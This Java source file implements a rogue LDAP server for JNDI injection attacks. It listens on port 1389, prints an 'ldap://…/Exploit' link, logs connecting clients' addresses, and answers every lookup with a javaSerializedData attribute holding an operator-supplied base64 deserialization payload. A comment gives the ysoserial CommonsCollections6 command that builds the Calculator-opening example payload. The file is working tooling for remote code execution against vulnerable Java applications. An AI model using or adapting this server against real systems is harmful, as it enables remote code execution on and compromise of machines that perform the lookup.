package LdapServer;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.LDAPListenerClientConnection;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import com.unboundid.util.Base64;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.lang.reflect.Method;
import java.net.InetAddress;
import java.text.ParseException;


public class ldap_server {


    private static final String LDAP_BASE = "dc=example,dc=com";
    private static  String Base64Code = null;
    private static final int port = 1389;
    private static String IP = "0.0.0.0";

    public static void setIP(String ip){
        IP = ip;
    }

    public static void setBase64Code(String Code) {
        Base64Code = Code;
    }

    public static void  server () {

        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor());
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("----------------------------JNDI Links---------------------------- ");
            System.out.println("Listening on ldap://"+ IP + ":" + port + "/Exploit");
            System.out.println();
            System.out.println("-----------------------------Server Log----------------------------");
            ds.startListening();

        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {
        public OperationInterceptor () {
        }

        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);

            // 反射获取客户端IP信息
            Class<?> clz = result.getClass().getSuperclass();;
            try {
                Method method = clz.getDeclaredMethod("getClientConnection");
                method.setAccessible(true);
                LDAPListenerClientConnection ldapListenerClientConnection = (LDAPListenerClientConnection)method.invoke(result,null);
                System.out.println(ldapListenerClientConnection.getName());
            } catch (Exception ex) {
                ex.printStackTrace();
            }

            System.out.println("[LDAPSERVER] >> Send LDAP reference result for " + base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }

        }
        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException {
            e.addAttribute("javaClassName", "Exploit");
            try {
                // java -jar ysoserial.jar CommonsCollections6 'open /System/Applications/Calculator.app'|base64
                e.addAttribute("javaSerializedData", Base64.decode(Base64Code));
            } catch (ParseException e1) {
                e1.printStackTrace();
            }
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }

    }
}
